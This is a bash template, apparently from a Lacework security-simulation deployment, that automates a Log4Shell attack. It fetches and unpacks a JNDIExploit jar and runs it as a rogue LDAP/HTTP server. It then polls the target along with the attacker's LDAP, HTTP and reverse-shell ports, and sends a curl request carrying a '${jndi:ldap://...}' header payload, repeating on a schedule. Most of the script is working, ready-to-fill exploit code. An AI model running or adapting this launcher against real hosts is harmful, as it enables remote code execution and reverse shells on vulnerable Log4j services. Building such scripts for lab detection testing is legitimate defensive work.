#!/usr/bin/env bash

# TEMPLATE INPUTS
# script_name: name of the script, which will be used for the log file (e.g. /tmp/<script_name>.log)
# log_rotation_count: total number of log files to keep
# apt_pre_tasks: shell commands to execute before install
# apt_packages: a list of apt packages to install
# apt_post_tasks: shell commands to execute after install
# yum_pre_tasks:  shell commands to execute before install
# yum_packages: a list of yum packages to install
# yum_post_tasks: shell commands to execute after install
# script_delay_secs: total number of seconds to wait before starting the next stage
# next_stage_payload: shell commands to execute after delay

export SCRIPTNAME="tag"
export LOCKFILE="/tmp/lacework_deploy_$SCRIPTNAME.lock"
export LOCKLOG=/tmp/lock_$SCRIPTNAME.log
export MAXLOG=2
truncate -s0 $LOCKLOG
# Initial lock is debug for lock handler
export LOGFILE=$LOCKLOG
function log {
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
}

# in some cases we'll have multiple executions as the same time - try to randomize start time
RAND_WAIT=$(($RANDOM%(300-30+1)+30))
log "waiting $RAND_WAIT seconds before starting..."
sleep $RAND_WAIT

if command -v yum && ! command -v ps; then
    RETRY="--setopt=retries=10"
    yum update $RETRY -y && yum $RETRY install -y procps
fi

CURRENT_PROCESS=$(echo $$)
PROCESSES=$(pgrep -f "\| tee /tmp/payload_$SCRIPTNAME \| base64 -d \| gunzip")
PROCESS_NAMES=$(echo -n $PROCESSES | xargs --no-run-if-empty ps fp)
COUNT=$(pgrep -f "\| tee /tmp/payload_$SCRIPTNAME \| base64 -d \| gunzip" | wc -l)
# logs initially appended to current log - no log rotate before checking lock file
log "Lock pids: $PROCESSES"
log "Lock process names: $PROCESS_NAMES"
log "Lock process count: $COUNT"
if [ -e "$LOCKFILE" ] && [ $COUNT -gt 1 ]; then
    log "LOCKCHECK: Another instance of the script is already running. Exiting..."
    exit 1
elif [ -e "$LOCKFILE" ] && [ $COUNT -eq 1 ]; then
    log "LOCKCHECK: Lock file with no running process found - updating lock file time and starting process"
    touch "$LOCKFILE"
else
    log "LOCKCHECK: No lock file and no running process found - creating lock file"
    mkdir -p "$(dirname "$LOCKFILE")" && touch "$LOCKFILE"
fi
function cleanup {
    rm -f "$LOCKFILE"
}
trap cleanup EXIT INT TERM
trap cleanup SIGINT

# Update lofile after lock check
export LOGFILE=/tmp/lacework_deploy_$SCRIPTNAME.log

# Log rotate
for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true

# Determine Package Manager
if command -v apt-get &>/dev/null; then
    export PACKAGE_MANAGER="apt-get"
    PACKAGES="git openjdk-11-jdk unzip"
    RETRY="-o Acquire::Retries=10"
elif command -v yum &>/dev/null; then
    export PACKAGE_MANAGER="yum"
    PACKAGES="git java-11-openjdk java-11-openjdk-devel unzip"
    RETRY="--setopt=retries=10"
else
    log "Neither apt-get nor yum found. Exiting..."
    exit 1
fi

# Wait for Package Manager
check_package_manager() {
    if [ "$PACKAGE_MANAGER" == "apt-get" ]; then
        # Return 0 (false) if a package manager process is found, indicating it's busy
        ! pgrep -f "apt-get (install|update|remove|upgrade)" && \
        ! pgrep -f "aptitude (install|update|remove|upgrade)" && \
        ! pgrep -f "dpkg (install|configure)"
    else
        # Similar logic for yum/rpm
        ! pgrep -f "yum (install|update|remove|upgrade)" && \
        ! pgrep -f "rpm (install|update|remove|upgrade)"
    fi
}

check_payload_update() {
    local payload_path=$1  # First argument passed to the function
    local start_hash=$2
    local check_hash=$(sha256sum --text "$payload_path" | awk '{ print $1 }')
    log "comparing start payload hash: $start_hash to current payload hash: $check_hash"
    if [ "$check_hash" != "$start_hash" ]; then
        log "payload update detected..."
        return 1  # Return 1 if payload update is detected
    else
        log "no payload update..."
        return 0  # Return 0 if no update is detected
    fi
}

# if package manager is busy wait some random amount of time - again to create more randomness
while ! check_package_manager; do
    RAND_WAIT=$(($RANDOM%(300-30+1)+30))
    log "Waiting for $PACKAGE_MANAGER to be available - sleeping $RAND_WAIT"
    sleep $RAND_WAIT
done

# export functions for child script usage
export -f log check_payload_update

# Conditional Commands based on package manager
if [ "$PACKAGE_MANAGER" == "apt-get" ]; then
log "Starting apt pre-task";
log "Checking for docker..."
while ! command -v docker > /dev/null || ! docker ps > /dev/null; do
    log "docker not found or not ready - waiting"
    sleep 120
done
log "docker path: $(command -v  docker)"

log "Done apt pre-task";
elif [ "$PACKAGE_MANAGER" == "yum" ]; then
log "Starting yum pre-task";
log "Checking for docker..."
while ! command -v docker > /dev/null || ! docker ps > /dev/null; do
    log "docker not found or not ready - waiting"
    sleep 120
done
log "docker path: $(command -v  docker)"

log "Done yum pre-task";
fi
if [ "" != "$PACKAGES" ]; then
    while true; do
        /bin/bash -c "$PACKAGE_MANAGER update && $PACKAGE_MANAGER install -y $PACKAGES" >> $LOGFILE 2>&1
        if [ $? -ne 0 ]; then
            log "Failed to install some_package using $PACKAGE_MANAGER - retry required"
            while ! check_package_manager; do
                RAND_WAIT=$(($RANDOM%(300-30+1)+30))
                log "Waiting for $PACKAGE_MANAGER to be available - sleeping $RAND_WAIT"
                sleep $RAND_WAIT
            done
        else
            break
        fi
    done
fi
if [ "$PACKAGE_MANAGER" == "apt-get" ]; then
log "Starting apt post-task";

log "Done apt post-task";
elif [ "$PACKAGE_MANAGER" == "yum" ]; then
log "Starting yum post-task";

log "Done yum post-task";
fi

MAX_WAIT=attack_delay
CHECK_INTERVAL=60
log "starting delay: $MAX_WAIT seconds"
SECONDS_WAITED=0
while true; do 
    SECONDS_WAITED=$((SECONDS_WAITED + CHECK_INTERVAL))
    if [ $SECONDS_WAITED -ge $MAX_WAIT ]; then
        log "completed wait $((MAX_WAIT / 60)) minutes." && break
    fi
    sleep $CHECK_INTERVAL;
done
log "delay complete"

log "starting next stage after $SECONDS_WAITED seconds..."
log "starting execution of next stage payload..."
log "removing previous app directory"
docker stop jndiexploit
rm -rf /jndiexploit
log "creating app directory"
mkdir -p /jndiexploit
cd /jndiexploit
    
log "starting script..."
JNDIEXPLOIT_URL="https://github.com/credibleforce/jndi/raw/main/jndi.base64"
NAME="jndiexploit"
IMAGE="openjdk:11"
ATTACKER_IP="attacker_ip"
ATTACKER_HTTP_PORT=attacker_http_port
ATTACKER_LDAP_PORT=attacker_ldap_port
TARGET_IP=target_ip
TARGET_PORT=target_port
EXEC_TYPE="Basic/Command/Base64"
REVERSE_SHELL_PORT="reverse_shell_port"
BASE64_PAYLOAD="cGF5bG9hZA%3D%3D"
PUBLIC_IP=$(curl -s https://icanhazip.com)
TIMEOUT=1800
START_TIME=$(date +%s)
# Check if $ATTACKER_IP is an IP address
if [[ $ATTACKER_IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    log "server is set to IP address $ATTACKER_IP, no need to resolve DNS"
else
    log "checking dns resolution: $ATTACKER_IP"
    while true; do
        IP=$(dig +short $ATTACKER_IP)
        if [ -z "$IP" ]; then  # If $IP is empty, the domain hasn't resolved yet
            CURRENT_TIME=$(date +%s)
            ELAPSED_TIME=$((CURRENT_TIME - START_TIME))
            if [ $ELAPSED_TIME -gt $TIMEOUT ]; then
                log "DNS resolution for $ATTACKER_IP timed out after $TIMEOUT seconds"
                exit 1
            fi
            sleep 10
        else
            log "Current public ip: $PUBLIC_IP"
            log "$ATTACKER_IP resolved to $IP"
            if [ "$IP" == "$PUBLIC_IP" ]; then
                log "Resolution matches public ip: $IP == $PUBLIC_IP"
                break
            else
                log "Resolution of dns does not match: $IP != $PUBLIC_IP"
                sleep 10
            fi
        fi
    done
fi

if [[ ! -f "jndi.base64" || ! -f "JNDIExploit-1.2-SNAPSHOT.jar" ]]; then
    rm -f jndi.base64 *.zip JNDIExploit-*.jar
    wget https://github.com/credibleforce/jndi/raw/main/jndi.base64
    base64 -d jndi.base64 > JNDIExploit.1.2.zip
    unzip -o JNDIExploit.*.zip
    rm *.zip
fi

START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
while true; do
    log "setting up jndiexploit in screen session..."
    if pgrep -f "JNDIExploit"; then
        kill -9 $(pgrep -f "JNDIExploit")
    fi
    JNDIEXPLOIT_LOG="/tmp/jndiexploit.log"
    for i in `seq $((MAXLOG-1)) -1 1`; do mv "$JNDIEXPLOIT_LOG."{$i,$((i+1))} 2>/dev/null || true; done
    mv $JNDIEXPLOIT_LOG "$JNDIEXPLOIT_LOG.1" 2>/dev/null || true
    screen -S jndiexploit -X quit
    screen -wipe
    screen -d -L -Logfile $JNDIEXPLOIT_LOG -S jndiexploit -m java -jar JNDIExploit-*.jar --ip $ATTACKER_IP --httpPort 8088 --ldapPort 1389
    screen -S jndiexploit -X colon "logfile flush 0^M"

    log "sleeping 15 minutes..."
    sleep 900
    log "start services availability check..."

    log "checking target: $TARGET_IP:$TARGET_PORT"
    while ! nc -z -w 5 -vv $TARGET_IP $TARGET_PORT > /dev/null; do
        log "failed check - waiting for target: $TARGET_IP:$TARGET_PORT";
        sleep 30;
        if ! screen -ls | grep jndiexploit; then
            log "screen session no longer running...reset required"
            break
        fi
        if ! check_payload_update /tmp/payload_$SCRIPTNAME $START_HASH; then
            log "payload update detected - exiting loop and forcing payload download"
            rm -f /tmp/payload_$SCRIPTNAME
            break 2
        fi
    done;
    if ! screen -ls | grep jndiexploit; then
        log "screen session no longer running...reset required"
        break
    fi
    log "target available";
    log "checking attacker ldap: $ATTACKER_IP:$ATTACKER_LDAP_PORT"
    while ! nc -z -w 5 -vv $ATTACKER_IP $ATTACKER_LDAP_PORT > /dev/null; do
        log "failed check - waiting for attacker ldap: $ATTACKER_IP:$ATTACKER_LDAP_PORT";
        sleep 30;
        if ! screen -ls | grep jndiexploit; then
            log "screen session no longer running...reset required"
            break
        fi
        if ! check_payload_update /tmp/payload_$SCRIPTNAME $START_HASH; then
            log "payload update detected - exiting loop and forcing payload download"
            rm -f /tmp/payload_$SCRIPTNAME
            break 2
        fi
    done;
    if ! screen -ls | grep jndiexploit; then
        log "screen session no longer running...reset required"
        break
    fi
    log "attacker ldap available";
    log "checking attacker http: $ATTACKER_IP:$ATTACKER_HTTP_PORT"
    while ! nc -z -w 5 -vv $ATTACKER_IP $ATTACKER_HTTP_PORT > /dev/null; do
        log "failed check - waiting for attacker http: $ATTACKER_IP:$ATTACKER_HTTP_PORT";
        sleep 30;
        if ! screen -ls | grep jndiexploit; then
            log "screen session no longer running...reset required"
                
        fi
        if ! check_payload_update /tmp/payload_$SCRIPTNAME $START_HASH; then
            log "payload update detected - exiting loop and forcing payload download"
            rm -f /tmp/payload_$SCRIPTNAME
            break 2
        fi
    done;
    if ! screen -ls | grep jndiexploit; then
        log "screen session no longer running...reset required"
        break
    fi
    log "attacker http available";
    if [ "0" != "$REVERSE_SHELL_PORT" ]; then
        log "checking attacker reverse shell: $ATTACKER_IP:$REVERSE_SHELL_PORT"
        while ! nc -z -w 5 -vv $ATTACKER_IP $REVERSE_SHELL_PORT > /dev/null; do
            log "failed check - waiting for attacker reverse shell: $ATTACKER_IP:$REVERSE_SHELL_PORT";
            sleep 30;
            if ! screen -ls | grep jndiexploit; then
                log "screen session no longer running...reset required"
            fi
            if ! check_payload_update /tmp/payload_$SCRIPTNAME $START_HASH; then
                log "payload update detected - exiting loop and forcing payload download"
                rm -f /tmp/payload_$SCRIPTNAME
                break 2
            fi
        done;
        log "attacker reverse shell available";
    fi
    sleep 30;
    if ! screen -ls | grep jndiexploit; then
        log "screen session no longer running...reset required"
        break
    fi
    log "sending payload: curl --verbose $TARGET_IP:$TARGET_PORT -H 'X-Api-Version: \${jndi:ldap://$ATTACKER_IP:$ATTACKER_LDAP_PORT/$EXEC_TYPE/$BASE64_PAYLOAD}'"
    /bin/bash -c "curl --verbose $TARGET_IP:$TARGET_PORT -H 'X-Api-Version: \${jndi:ldap://$ATTACKER_IP:$ATTACKER_LDAP_PORT/$EXEC_TYPE/$BASE64_PAYLOAD}'"
    log "done";
    log 'waiting 30 minutes...';
    sleep 1800
    if ! check_payload_update /tmp/payload_$SCRIPTNAME $START_HASH; then
        log "payload update detected - exiting loop and forcing payload download"
        rm -f /tmp/payload_$SCRIPTNAME
        break
    else
        log "waiting attack_delay seconds...";
        sleep attack_delay
    fi
done
log "Done."

log "done next stage payload execution."

log "Done"